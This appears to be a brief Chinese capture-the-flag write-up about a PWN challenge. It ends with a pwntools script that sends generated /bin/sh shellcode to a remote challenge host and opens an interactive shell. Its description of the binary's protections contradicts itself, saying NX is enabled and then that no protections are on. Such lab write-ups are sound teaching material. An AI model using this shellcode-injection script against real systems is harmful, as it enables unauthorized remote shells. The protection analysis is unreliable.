---
title: shellcode
date: '2025-6-14 22:00'
categories:
  - PWN
---
![](/images/{D963E729-82E8-4920-BCC6-3E43CDB31255}1.png)
检查安全机制发现 **NX (No-Execute) 已启用**，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 **后门函数**，这应该才是解题的关键。
![](/images/Pastedimage20250605220423.png)
![](/images/Pastedimage20250605220507.png)
也没有开啥保护。
logo明显提示用shellcode,所以我们需要发送sellcode。
```python
from pwn import *
e=ELF("./pwn3")
p=remote("10.190.131.17",62534)
shellcode=asm(shellcraft.sh())
payload=shellcode
p.sendline(payload)
p.interactive()
```
![](/images/{17DD8EEB-247B-4BB2-8BA3-995677E38184}1.png)